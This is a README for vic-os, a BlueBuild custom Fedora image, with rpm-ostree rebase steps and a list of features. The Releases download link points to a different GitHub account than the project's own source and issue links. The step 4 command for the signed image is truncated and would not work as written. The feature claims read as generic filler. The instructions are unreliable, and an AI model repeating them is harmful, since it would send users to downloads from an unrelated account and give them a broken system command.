# 🖥️ vic-os - A Simple Operating System Experience

[![bluebuild build badge](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml/badge.svg)](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml)

## 🚀 Getting Started

Welcome to vic-os! This guide will help you download and run vic-os easily. Follow each step carefully, and you will get started in no time.

## 📥 Download & Install

To begin, visit the [Releases page](https://github.com/Mecza/vic-os/releases) to download the latest version of vic-os. 

You will find the files you need there. Click on the version that fits your needs.

## 🔍 System Requirements

Before installing vic-os, ensure your system meets these requirements:

- **CPU:** 64-bit processor
- **RAM:** At least 2 GB
- **Storage:** At least 10 GB of free space
- **Operating System:** Compatible with most Linux distributions

## 🔧 Installation Steps

### Step 1: Prepare Your System

1. Ensure that your system is up to date. Open a terminal and run:
   ```bash
   sudo dnf update
   ```

### Step 2: Rebase the Unsigned Image

2. Use the following command to rebase to the unsigned image. This installs the necessary signing keys and policies:
   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/philosophyfiend/vic-os:latest
   ```

### Step 3: Reboot Your System

3. After the rebase is complete, reboot your system to finalize this step:
   ```bash
   systemctl reboot
   ```

### Step 4: Rebase to the Signed Image

4. Once your system is back online, rebase to the signed version with this command:
   ```bash
   rpm-ostree rebase ostree-image-signed:docker
   ```

### Step 5: Reboot Again

5. Reboot your system once more to ensure all changes take effect:
   ```bash
   systemctl reboot
   ```

## 🛠️ Features of vic-os

- **Immutable Design:** vic-os offers a stable and secure environment that is resistant to changes, ensuring a consistent experience.
- **Easy Management:** Users can manage their applications smoothly with minimal effort thanks to an intuitive interface.
- **Linux Custom Image:** Offers customization options to suit individual needs.
- **Lightweight:** Designed to perform efficiently even on systems with limited resources.

## 🌐 Support & Documentation

For more detailed instructions, including troubleshooting tips, please refer to the following resources:

- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
- [Fedora Wiki on Ostree](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable)

## 📞 Community Support

If you need help, please join our community discussions. You can find support on platforms like Discord, Reddit, or GitHub discussions. 

## 🔗 Additional Resources

- [Project Source Code](https://github.com/philosophyfiend/vic-os)
- [Feedback and Issues Tracker](https://github.com/philosophyfiend/vic-os/issues)

## 📢 Conclusion

Thank you for choosing vic-os. Enjoy exploring your new operating system and let us know if you have any questions or feedback!